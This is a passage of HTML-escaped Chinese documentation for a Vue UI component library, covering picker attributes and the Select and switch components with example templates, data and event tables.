class=\"heading\"\u003eAttributes\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e可选值\u003c/th\u003e\n\u003cth\u003e默认值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003edefault\u003c/td\u003e\n\u003ctd\u003epicker默认选中的值\u003c/td\u003e\n\u003ctd\u003estring/number\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etype\u003c/td\u003e\n\u003ctd\u003epicker类型\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003edate/time/datetime/custom\u003c/td\u003e\n\u003ctd\u003edatetime\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etitle\u003c/td\u003e\n\u003ctd\u003e选择器弹窗标题\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eplaceholder\u003c/td\u003e\n\u003ctd\u003eplaceholder\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e请选择时间\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etimeStep\u003c/td\u003e\n\u003ctd\u003e时间选择粒度(有分钟的选择器)\u003c/td\u003e\n\u003ctd\u003enumber\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e1\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003estartYear\u003c/td\u003e\n\u003ctd\u003e起始年份\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e今年\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eendYear\u003c/td\u003e\n\u003ctd\u003e结束年份\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e10年的范围\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003estartDate\u003c/td\u003e\n\u003ctd\u003e起始日期\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eendDate\u003c/td\u003e\n\u003ctd\u003e结束日期\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003estartHour\u003c/td\u003e\n\u003ctd\u003e起始时间\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eendHour\u003c/td\u003e\n\u003ctd\u003e结束时间\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e23\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003estartMinute\u003c/td\u003e\n\u003ctd\u003e起始分钟\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eendMinute\u003c/td\u003e\n\u003ctd\u003e结束分钟\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e59\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eyearFormat\u003c/td\u003e\n\u003ctd\u003e“年“的格式化\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e{value}年\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003emonthFormat\u003c/td\u003e\n\u003ctd\u003e“月“的格式化\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e{value}月\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003edayFormat\u003c/td\u003e\n\u003ctd\u003e“日“的格式化\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e{value}日\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ehourFormat\u003c/td\u003e\n\u003ctd\u003e“时“的格式化\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e{value}时\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eminuteFormat\u003c/td\u003e\n\u003ctd\u003e“分“的格式化\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e{value}分\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 class=\"heading\"\u003e7. Select 选择器\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e当选项过多时，使用下拉菜单展示并选择内容。\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e基础用法\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e只有一个select\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ex-select\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"LIST ONE\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003edefaultValue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"0\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:selectData\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"selectData\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:alwaysShowTitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e\n    @\u003cspan class=\"hljs-attr\"\u003esearch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"searchFn\"\u003c/span\u003e\n    \u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ex-select\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003eselectData\u003c/span\u003e: [\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 1\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 2\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 3\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 4\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 5\"\u003c/span\u003e }\n      ],\n    };\n  },\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    searchFn(index, id) {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(index, id);\n    }\n  }\n};\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e两个及多个（需设置width属性）\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- first --\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-select\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"LIST ONE\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"50%\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003edefaultValue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"0\"\u003c/span\u003e\n    @\u003cspan class=\"hljs-attr\"\u003esearch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"searchFn\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:selectData\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"selectData\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:alwaysShowTitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"false\"\u003c/span\u003e\n    \u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-select\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- second --\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-select\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"LIST TWO\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"50%\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003eellipsisWidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"65px\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003edefaultValue\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"1\"\u003c/span\u003e\n    @\u003cspan class=\"hljs-attr\"\u003esearch\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"searchFn1\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:selectData\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"selectData1\"\u003c/span\u003e\n    \u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-select\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003eselectData\u003c/span\u003e: [\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 1\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 2\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 3\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 4\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST ONE 5\"\u003c/span\u003e }\n      ],\n      \u003cspan class=\"hljs-attr\"\u003eselectData1\u003c/span\u003e: [\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST TWO 1\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST TWO 2\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST TWO 3\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST TWO 4\"\u003c/span\u003e },\n        { \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e, \u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"LIST TWO 5\"\u003c/span\u003e }\n      ]\n    };\n  },\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    searchFn(index, id) {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(index, id);\n    },\n    searchFn1(index, id) {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(index, id);\n    }\n  }\n};\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eAttributes\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e可选值\u003c/th\u003e\n\u003cth\u003e默认值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eselectData\u003c/td\u003e\n\u003ctd\u003e下拉数据\u003c/td\u003e\n\u003ctd\u003earray\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e[]\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etitle\u003c/td\u003e\n\u003ctd\u003e默认显示的标题\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ealwaysShowTitle\u003c/td\u003e\n\u003ctd\u003e是否一直显示默认标题\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003efalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003edefaultValue\u003c/td\u003e\n\u003ctd\u003e默认选中的值\u003c/td\u003e\n\u003ctd\u003enumber/string\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e0\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ewidth\u003c/td\u003e\n\u003ctd\u003eselect组件的宽度\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e100%\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eellipsisWidth\u003c/td\u003e\n\u003ctd\u003eselect文字超过多出省略号的宽度\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e120px\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003eEvents\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e事件名称\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e回调参数\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003esearch\u003c/td\u003e\n\u003ctd\u003eselect 选择时的回调函数\u003c/td\u003e\n\u003ctd\u003e参数1：索引，参数2：所中项的id值\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 class=\"heading\"\u003e8. switch\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e表示两种相互对立的状态间的切换，多用于触发「开/关」。\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e基本用法\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e注：如果未使用v-model指令进行值的双向绑定，则switch会显示value值对应的位置，但不能进行on-off操作\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eul\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'v-list'\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e默认switch，值：{{val1}}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-switch\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-model\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"val1\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-switch\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e设置宽高，默认选中，值：{{val2}}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-switch\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003echange\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"handleChange\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-model\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"val2\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"50\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eheight\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"30\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-switch\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e禁止点击，值：{{val3}}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-switch\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:disabled\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-switch\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e禁止点击，默认选中，值：{{val4}}\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-switch\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003e:disabled\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"true\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ev-model\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"val4\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-switch\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eli\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eul\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data () {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003eval1\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003eval2\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003eval3\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n      \u003cspan class=\"hljs-attr\"\u003eval4\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    handleChange (val, oldVal) {\n      \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(val, oldVal);\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 